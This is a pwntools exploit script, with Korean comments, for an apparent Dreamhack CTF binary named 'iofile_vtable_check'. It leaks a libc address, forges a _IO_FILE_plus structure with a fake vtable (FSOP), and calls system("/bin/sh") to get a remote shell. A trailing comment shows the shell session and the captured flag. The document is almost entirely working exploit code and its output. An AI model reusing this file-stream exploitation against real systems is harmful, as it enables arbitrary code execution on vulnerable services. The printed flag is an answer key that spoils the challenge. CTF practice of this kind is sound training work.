from pwn import *
context.update(arch='amd64', os='linux')
context.log_level = 'debug'

p = remote("host3.dreamhack.games", 22227);
#p = process('./iofile_vtable_check')
libc = ELF("./libc.so.6")
elf = ELF("./iofile_vtable_check")


p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil(b"\n")[:-1], 16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))
fp = elf.sym['fp']
fake_vtable = libc_base + libc.sym['_IO_file_jumps'] + 0xc0

print(f"""
[*] Leaked stdout        : {hex(stdout)}
[*] Libc Base Address    : {hex(libc_base)}
[*] System Address       : {hex(system)}
[*] Target File Pointer  : {hex(fp)}
[*] "/bin/sh" Address    : {hex(binsh)}
[*] Fake Vtable Address  : {hex(fake_vtable)}
""")

# 3. 페이로드 생성: FSOP(File Stream Oriented Programming) 공격을 위한 _IO_FILE_plus 구조체 조작
# vtable을 조작하여 system("/bin/sh")를 호출하는 것이 목표
payload = b''
payload += p64(0) * 7               # _flags부터 _IO_write_end까지의 필드를 0으로 채움
payload += p64(binsh)               # _IO_buf_base를 "/bin/sh" 문자열 주소로 설정 (system 함수의 인자)
payload += p64(0) * 9               # _IO_buf_end부터 _lock 전까지의 필드를 0으로 채움
payload += p64(fp + 0x80)           # _lock은 쓰기 가능한 주소를 가리켜야 함
payload += p64(0) * 9               # vtable 포인터 전까지의 패딩
payload += p64(fake_vtable)         # vtable 포인터를 조작된 fake_vtable 주소로 덮어쓰기
payload += p64(0)                   # 추가 데이터
payload += p64(system)              # 조작된 vtable이 최종적으로 호출할 함수의 주소 (system)

p.sendlineafter(b"Data: ", payload)
p.interactive()

'''
stdout : 0x7f41a32e1760
libc_base : 0x7f41a2ef5000
system : 0x7f41a2f44440
fp : 0x6010a0
binsh : 0x7f41a30a8e9a
fake vtable : 0x7f41a32dd360
[*] Switching to interactive mode
$ ls
flag
iofile_vtable_check
$ cat flag
DH{5b042802448cd05f035aed55f8e7af0b}$ 
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 17894
'''